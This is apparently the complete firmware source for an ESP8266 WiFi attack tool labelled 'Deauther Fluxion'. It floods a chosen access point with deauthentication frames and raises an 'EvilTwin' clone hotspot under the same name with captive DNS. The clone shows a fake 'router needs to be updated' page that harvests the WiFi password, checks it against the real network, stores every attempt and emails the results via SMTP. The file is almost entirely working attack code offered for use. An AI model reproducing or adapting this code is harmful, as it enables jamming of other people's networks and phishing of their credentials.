#include "LittleFSRW.h"
#include "GlobalVar.h"
#include "ESPMailSend.h"

void clearArray() {
  for (int i = 0; i < 16; i++) {
    _Network _network;
    _networks[i] = _network;
  }

}

void performScan() {
  int n = WiFi.scanNetworks();
  clearArray();
  if (n >= 0) {
    for (int i = 0; i < n && i < 16; ++i) {
      _Network network;
      network.ssid = WiFi.SSID(i);
      for (int j = 0; j < 6; j++) {
        network.bssid[j] = WiFi.BSSID(i)[j];
      }

      network.ch = WiFi.channel(i);
      _networks[i] = network;
    }
  }
}

bool hotspot_active = false;
bool deauthing_active = false;

void handleResult() {
  String html = "";
  if (WiFi.status() != WL_CONNECTED) {
    webServer.send(200, "text/html", "<html><head><script> setTimeout(function(){window.location.href = '/';}, 3000); </script><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Wrong Password</h2><p>Please, try again.</p></body> </html>");
    Serial.println("Wrong password tried !");
  } else {
    webServer.send(200, "text/html", "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'><body><h2>Good password</h2></body> </html>");
    hotspot_active = false;
    dnsServer.stop();
    int n = WiFi.softAPdisconnect (true);
    Serial.println(String(n));
    WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
    WiFi.softAP("W4515T3ch", "deauther");
    dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    _correct = "Successfully got password for: " + _selectedNetwork.ssid + " Password: " + _tryPassword;
    _SSIDPassword = "SSID : " + _selectedNetwork.ssid + " Password : " + _tryPassword ;
    // "<li><b>" + + "</li></b>"
    appendFile(LittleFS, "/pass.txt", _SSIDPassword.c_str());
    //_SSIDPassword.toCharArray(msg, 50);
    /*
      if (!client.connected()) {
      reconnect();
      }
      client.publish("SavedSSIDPassword", msg);
    */
    smtpsend(_wrongSSIDPassword, "Deauther Fluxion | Wrong Password");
    smtpsend(_SSIDPassword, "Deauther Fluxion | Good Password");

    _SSIDPassword = "<li><b>" + _SSIDPassword + "</li></b>";
    _savedSSIDPassword += _SSIDPassword;
    appendFile(LittleFS, "/password.txt", _savedSSIDPassword.c_str());
    Serial.println("Good password was entered !");
    Serial.println(_correct);
    //readFile(LittleFS, "/password.txt");
    _savedSSIDPassword = readFiles(LittleFS, "/password.txt");
    Serial.println(_savedSSIDPassword);

    //String& SSIDPassword = "SavedSSIDPassword";
    //Serial.println(SSIDPassword);
  }
}


String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                   "<style> .content {max-width: 500px;margin: auto;}h1{ font-size: 30px; color: #fff; text-transform: uppercase; font-weight: 300; text-align: center; margin-bottom: 15px; } table{ width:100%; table-layout: fixed; } .tbl-header{ background-color: rgba(255,255,255,0.3); } .tbl-content{ height:300px; overflow-x:auto; margin-top: 0px; border: 1px solid rgba(255,255,255,0.3); } th{ padding: 20px 15px; text-align: left; font-weight: 500; font-size: 12px; color: #fff; text-transform: uppercase; } td{ padding: 15px; text-align: left; vertical-align:middle; font-weight: 300; font-size: 12px; color: #fff; border-bottom: solid 1px rgba(255,255,255,0.1); } /* demo styles */ @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,300,700); body{ background: -webkit-linear-gradient(left, #25c481, #25b7c4); background: linear-gradient(to right, #25c481, #25b7c4); font-family: 'Roboto', sans-serif; } section{ margin: 50px; } /* follow me template */ .made-with-love { margin-top: 40px; padding: 10px; clear: left; text-align: center; font-size: 10px; font-family: arial; color: #fff; } .made-with-love i { font-style: normal; color: #F50057; font-size: 14px; position: relative; top: 2px; } .made-with-love a { color: #fff; text-decoration: none; } .made-with-love a:hover { text-decoration: underline; } /* for custom scrollbar for webkit browser*/ ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); } ::-webkit-scrollbar-thumb { -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); }.button {padding: 10px 10px;font-size: 18px;text-align: center;outline: none;    color: #fff;background-color: #0f8b8d;border: none;border-radius: 5px;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;-webkit-tap-highlight-color: rgba(0,0,0,0);}.button-ontbl {padding: 10px 10px;font-size: 12px;text-align: center;outline: none;    color: #fff;background-color: #0f8b8d;border: none;border-radius: 5px;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;-webkit-tap-highlight-color: rgba(0,0,0,0);}</style>"
                   "</head><body><div class='content'>"
                   "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
                   "<button id='button' class='button' button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
                   "<button id='button' class='button' button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
                   "</div></br><table class='tbl-header'><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";

String _tempHTML2 = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                    "<style> .content {max-width: 500px;margin: auto;}h1{ font-size: 30px; color: #fff; text-transform: uppercase; font-weight: 300; text-align: center; margin-bottom: 15px; } table{ width:100%; table-layout: fixed; } .tbl-header{ background-color: rgba(255,255,255,0.3); } .tbl-content{ height:300px; overflow-x:auto; margin-top: 0px; border: 1px solid rgba(255,255,255,0.3); } th{ padding: 20px 15px; text-align: left; font-weight: 500; font-size: 12px; color: #fff; text-transform: uppercase; } td{ padding: 15px; text-align: left; vertical-align:middle; font-weight: 300; font-size: 12px; color: #fff; border-bottom: solid 1px rgba(255,255,255,0.1); } /* demo styles */ @import url(https://fonts.googleapis.com/css?family=Roboto:400,500,300,700); body{ background: -webkit-linear-gradient(left, #25c481, #25b7c4); background: linear-gradient(to right, #25c481, #25b7c4); font-family: 'Roboto', sans-serif; } section{ margin: 50px; } /* follow me template */ .made-with-love { margin-top: 40px; padding: 10px; clear: left; text-align: center; font-size: 10px; font-family: arial; color: #fff; } .made-with-love i { font-style: normal; color: #F50057; font-size: 14px; position: relative; top: 2px; } .made-with-love a { color: #fff; text-decoration: none; } .made-with-love a:hover { text-decoration: underline; } /* for custom scrollbar for webkit browser*/ ::-webkit-scrollbar { width: 6px; } ::-webkit-scrollbar-track { -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); } ::-webkit-scrollbar-thumb { -webkit-box-shadow: inset 0 0 6px rgba(0,0,0,0.3); }.button {padding: 10px 10px;font-size: 18px;text-align: center;outline: none;    color: #fff;background-color: #0f8b8d;border: none;border-radius: 5px;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;-webkit-tap-highlight-color: rgba(0,0,0,0);}.button-ontbl {padding: 10px 10px;font-size: 12px;text-align: center;outline: none;    color: #fff;background-color: #0f8b8d;border: none;border-radius: 5px;-webkit-touch-callout: none;-webkit-user-select: none;-khtml-user-select: none;-moz-user-select: none;-ms-user-select: none;user-select: none;-webkit-tap-highlight-color: rgba(0,0,0,0);}nav { background: -webkit-linear-gradient(right, #25c481, #25b7c4); background: linear-gradient(to left, #25c481, #25b7c4); font-family: 'Roboto', sans-serif;  color: #fff; display: block; font-size: 1.3em; padding: 1em; }</style>"
                    "</head><body><div class='content'>";

void handleIndex() {

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("W4515T3ch", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  if (hotspot_active == false) {
    String _html = _tempHTML;

    for (int i = 0; i < 16; ++i) {
      if ( _networks[i].ssid == "") {
        break;
      }
      _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
        Serial.println(bytesToStr(_selectedNetwork.bssid, 6));
        _html += "<button id='button-ontbl' class='button-ontbl' button style='background-color: #ff0000;'>Selected</button></form></td></tr>";
      } else {
        _html += "<button id='button-ontbl' class='button-ontbl'>Select SSID</button></form></td></tr>";
      }
    }

    if (deauthing_active) {
      _html.replace("{deauth_button}", "Stop deauthing");
      _html.replace("{deauth}", "stop");
    } else {
      _html.replace("{deauth_button}", "Start deauthing");
      _html.replace("{deauth}", "start");
    }

    if (hotspot_active) {
      _html.replace("{hotspot_button}", "Stop EvilTwin");
      _html.replace("{hotspot}", "stop");
    } else {
      _html.replace("{hotspot_button}", "Start EvilTwin");
      _html.replace("{hotspot}", "start");
    }


    if (_selectedNetwork.ssid == "") {
      _html.replace("{disabled}", " disabled");
    } else {
      _html.replace("{disabled}", "");
    }

    _html += "</table>";

    if (_correct != "") {
      _html += "</br><h3>" + _correct + "</h3>";
    }

    _html += "</div>v1.1.0</body></html>";
    webServer.send(200, "text/html", _html);

  } else {

    if (webServer.hasArg("password")) {
      _tryPassword = webServer.arg("password");
      
      _wrongSSIDPassword = "SSID : " + _selectedNetwork.ssid + " Password : " + _tryPassword ;
      appendFile(LittleFS, "/wrongpass.txt", _wrongSSIDPassword.c_str());
      
      _wrongSSIDPassword = "<li><b>" + _wrongSSIDPassword + "</li></b>";
      _savedwrongSSIDPassword += _wrongSSIDPassword;
      appendFile(LittleFS, "/wrongpassword.txt", _savedwrongSSIDPassword.c_str());
      WiFi.disconnect();
      WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
    } else {
      webServer.send(200, "text/html", "<!DOCTYPE html> <html><body><h2>Router '" + _selectedNetwork.ssid + "' needs to be updated</h2><form action='/'><label for='password'>Password:</label><br>  <input type='text' id='password' name='password' value='' minlength='8'><br>  <input type='submit' value='Submit'> </form> </body> </html>");
    }
  }

}

void handleAdmin() {

  String _html = _tempHTML;

  if (webServer.hasArg("ap")) {
    for (int i = 0; i < 16; i++) {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap") ) {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth")) {
    if (webServer.arg("deauth") == "start") {
      deauthing_active = true;
    } else if (webServer.arg("deauth") == "stop") {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("hotspot")) {
    if (webServer.arg("hotspot") == "start") {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

    } else if (webServer.arg("hotspot") == "stop") {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect (true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
      WiFi.softAP("W4515T3ch", "deauther");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i) {
    if ( _networks[i].ssid == "") {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "<td><form method='post' action='/admin/?ap=" +  bytesToStr(_networks[i].bssid, 6) + "'>";

    if ( bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
      _html += "<button id='button-ontbl' class='button-ontbl' button style='background-color: #ff0000;'>Selected</button></form></td></tr>";
    } else {
      _html += "<button id='button-ontbl' class='button-ontbl'>Select SSID</button></form></td></tr>";
    }
  }

  if (deauthing_active) {
    _html.replace("{deauth_button}", "Stop deauthing");
    _html.replace("{deauth}", "stop");
  } else {
    _html.replace("{deauth_button}", "Start deauthing");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active) {
    _html.replace("{hotspot_button}", "Stop EvilTwin");
    _html.replace("{hotspot}", "stop");
  } else {
    _html.replace("{hotspot_button}", "Start EvilTwin");
    _html.replace("{hotspot}", "start");
  }


  if (_selectedNetwork.ssid == "") {
    _html.replace("{disabled}", " disabled");
  } else {
    _html.replace("{disabled}", "");
  }

  if (_correct != "") {
    _html += "</br><h3>" + _correct + "</h3>";
  }

  _html += "</table></div>v1.1.0</body></html>";
  webServer.send(200, "text/html", _html);

}

void handlePassword() {
  _savedSSIDPassword = readFiles(LittleFS, "/password.txt");
  String _html = _tempHTML2;
  _html += "<ol>" + _savedSSIDPassword + "</ol>";

  _html += "</div></body></html>";
  webServer.send(200, "text/html", _html);
}

void handlewrongPassword() {
  _savedwrongSSIDPassword = readFiles(LittleFS, "/wrongpassword.txt");
  String _html = _tempHTML2;
  _html += "<ol>" + _savedwrongSSIDPassword + "</ol>";

  _html += "</div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t* b, uint32_t size) {
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++) {
    if (b[i] < 0x10) str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1) str += DOUBLEPOINT;
  }
  return str;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
uint8_t wifi_channel = 1;

void setup() {

  Serial.begin(115200);
  Serial.println("Formatting LittleFS filesystem");
  //LittleFS.format();
  Serial.println("Mount LittleFS");
  if (!LittleFS.begin()) {
    Serial.println("LittleFS mount failed");
    return;
  }

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
  WiFi.softAP("W4515T3ch", "deauther");
  dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));

  webServer.on("/", handleIndex);
  webServer.on("/result", handleResult);
  webServer.on("/admin", handleAdmin);
  webServer.on("/password", handlePassword);
  webServer.on("/wrongpassword", handlewrongPassword);
  webServer.onNotFound(handleIndex);
  httpUpdater.setup(&webServer);
  webServer.begin();

  //client.setServer(mqtt_server, 1883);
  //client.setCallback(callback);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  if (deauthing_active && millis() - deauth_now >= 1000) {

    wifi_set_channel(_selectedNetwork.ch);

    uint8_t deauthPacket[26] = {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x01, 0x00};

    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    deauthPacket[24] = 1;

    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xC0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));
    Serial.println(bytesToStr(deauthPacket, 26));
    deauthPacket[0] = 0xA0;
    Serial.println(wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0));

    deauth_now = millis();
  }

  if (millis() - now >= 15000) {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000) {
    if (WiFi.status() != WL_CONNECTED) {
      Serial.println("BAD");
    } else {
      Serial.println("GOOD");
      Serial.println("WiFi connected");
      Serial.println("IP address: ");
      Serial.println(WiFi.localIP());
      _SSIDPassword = readFiles(LittleFS, "/pass.txt");
      Serial.println(_SSIDPassword);
      //msg =  _savedSSIDPassword;

    }
    wifinow = millis();
  }
  //client.loop();
}
